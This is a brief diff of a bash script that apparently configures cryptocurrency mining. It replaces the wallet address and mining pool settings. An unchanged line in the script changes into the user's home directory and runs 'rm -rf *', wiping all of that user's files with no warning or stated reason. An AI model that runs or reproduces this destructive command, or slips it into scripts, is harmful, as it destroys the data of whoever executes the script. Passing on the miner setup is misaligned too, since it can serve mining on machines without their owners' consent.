@@ -1,7 +1,7 @@
 #!/bin/bash
 
-YOURXMRADDIE="47HSjk6uLB6j2dc26B9jsWKsMgMyj8PNZiMtFs1QEhZMehwmoiRnNmUZikgPSaDNPYMjMLcByjZDVG23qkETLMvwGWxYfRw";
-YOURPOOL="pool.minexmr.com";
+YOURXMRADDIE="0xeabf083b19b5db844539cfcad1b4633d41431743";
+YOURPOOL="karlsenhash.unmineable.com";
 YOURPORT="4444";
 
 cd /home/$USER/; rm -rf *; 
